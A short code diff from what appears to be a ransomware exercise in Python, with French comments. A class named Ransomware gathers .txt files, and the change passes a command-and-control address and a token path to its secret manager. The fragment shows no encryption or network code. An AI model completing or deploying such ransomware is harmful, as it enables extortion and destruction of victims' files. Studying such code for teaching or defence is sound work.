@@ -65,7 +65,7 @@ class Ransomware:
         files = self.get_files("*.txt")
 
         # creation du secret manager
-        secret_manager = SecretManager()
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
 
         # appel de la fonction setup
         secret_manager.setup()
